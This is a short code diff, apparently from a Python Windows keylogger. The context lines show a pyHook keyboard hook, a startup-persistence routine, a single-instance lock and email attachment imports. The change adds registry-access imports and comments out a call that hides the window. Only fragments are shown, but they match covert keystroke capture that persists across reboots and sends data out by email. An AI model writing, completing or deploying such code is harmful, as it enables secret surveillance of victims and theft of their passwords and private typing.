@@ -18,6 +18,8 @@ from email.MIMEText import MIMEText
 from email.MIMEAudio import MIMEAudio
 import mimetypes
 import win32event, win32api, winerror
+import sys
+from _winreg import *
 
 
 
@@ -193,7 +195,7 @@ def main():
     hm.HookKeyboard()
     pythoncom.PumpMessages()
 
-hide()
+##hide()
 addStartup()
 hm = pyHook.HookManager()
 disallow_Multiple_Instances()
